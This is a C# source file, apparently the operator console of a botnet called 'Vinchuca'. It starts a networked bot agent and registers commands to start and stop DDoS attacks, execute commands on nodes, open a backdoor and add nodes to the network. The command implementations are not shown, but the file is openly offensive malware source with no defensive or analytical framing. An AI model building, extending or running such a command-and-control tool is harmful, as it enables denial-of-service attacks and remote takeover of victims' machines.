using System;
using Mono.Options;
using REPL.Commands;
using Vinchuca;
using Vinchuca.Network;

namespace REPL
{
    class Program
    {
        static void Main(string[] args)
        {
            var console = new VirtualConsole(0, Console.WindowHeight);
            var repl = new CommandLineReader(console);
            var agent = new Agent(33333, BotIdentifier.Id);
            agent.Run();

            var suite = new CommandSet("vicha", null, console, console) {
                "usage: COMMAND [OPTIONS]+.",
                "Available commands are:",
                "",
                // { "v:", "verbosity", (int? v) => Verbosity = v.HasValue ? v.Value : Verbosity+1 },
		        // Commands may also be specified
		        new DDoSStartCommand(agent, repl),
                new DDoSStopCommand(agent, repl),
                new ExecuteCommand(agent, repl),
                new BackdoorCommand(agent, repl),
                new AddNodeCommand(agent, repl),
                new DebugCommand(agent, repl),
                new Command("clear", "Clear the screen")
                {
                    Run = x=>repl.Clear()
                },
                new Command("exit", "Finished the control seesion and close the agent")
                {
                    Run = x=>Environment.Exit(0)
                }
            };
            
            repl.NewCommand += (sender, eventArgs) =>
                suite.Run(eventArgs.Command.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries));
            repl.Run();

        }
    }
}
